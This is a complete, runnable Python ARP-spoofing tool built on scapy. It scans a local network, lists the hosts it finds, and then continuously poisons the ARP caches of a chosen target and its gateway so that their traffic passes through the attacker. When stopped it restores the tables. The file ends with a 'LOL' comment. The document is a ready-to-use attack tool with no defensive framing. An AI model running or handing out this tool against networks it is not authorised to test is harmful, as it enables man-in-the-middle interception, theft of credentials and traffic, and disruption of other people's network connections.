#!/usr/bin/env python3

import scapy.all as scapy
import time
import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    arp_check = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_cb = broadcast/arp_check
    answered_list = scapy.srp(arp_cb, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Error: Could not get MAC address for {ip}. Device may be offline, IP invalid, or unresponsive.")
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[-] Cannot spoof {target_ip}: MAC address not found. Skipping spoof for this target.")
        return

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac is None:
        print(f"[-] Cannot restore ARP for {destination_ip}: Its MAC address not found.")
        return
    if source_mac is None:
        print(f"[-] Cannot restore ARP for {destination_ip} regarding {source_ip}: MAC for {source_ip} not found.")
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def netscanner(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_req_broadcast, timeout=2, verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

def print_scan_result(results):
    print("Available devices on the network:")
    print("-----------------------------------------")
    print("IP Address\t\tMAC Address")
    print("-----------------------------------------")
    for client in results:
        print(f"{client['ip']}\t\t{client['mac']}")
    print("-----------------------------------------")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    try:
        network_segment = input("[+] Enter network segment to scan (e.g., 192.168.1.0/24): ")
        clear_screen()
        print("[+] Scanning network...")
        scan_result = netscanner(network_segment)
        print_scan_result(scan_result)

        target_ip_str = input("[+] Enter Target IP address: ")
        gateway_ip_str = input("[+] Enter Gateway (Router) IP address: ")
        clear_screen()

        sent_packets_count = 0
        print("[+] ARP Spoofer started.")
        print(f"[+] Targeting IP: {target_ip_str}")
        print(f"[+] Gateway IP: {gateway_ip_str}")
        print("[+] Press Ctrl+C to stop and restore ARP tables.")

        if get_mac(target_ip_str) is None:
            print(f"[-] Target IP {target_ip_str} is unresponsive or invalid. Exiting.")
            exit()
        if get_mac(gateway_ip_str) is None:
            print(f"[-] Gateway IP {gateway_ip_str} is unresponsive or invalid. Exiting.")
            exit()

        print("[+] Initial MAC addresses retrieved successfully. Starting spoofing loop...")

        while True:
            spoof(target_ip_str, gateway_ip_str)
            spoof(gateway_ip_str, target_ip_str)

            sent_packets_count = sent_packets_count + 1
            print("\r[*] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[-] Detected Ctrl+C ... Resetting ARP tables... Please wait.")
        restore(target_ip_str, gateway_ip_str)
        restore(gateway_ip_str, target_ip_str)
        print("[+] ARP tables restored successfully. Exiting.")

    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {e}")
        print("[-] Attempting to restore ARP tables before exiting (might be incomplete).")
        if 'target_ip_str' in locals() and 'gateway_ip_str' in locals():
            restore(target_ip_str, gateway_ip_str)
            restore(gateway_ip_str, target_ip_str)
        print("[+] ARP tables restoration attempt finished. Exiting.")

## LOL
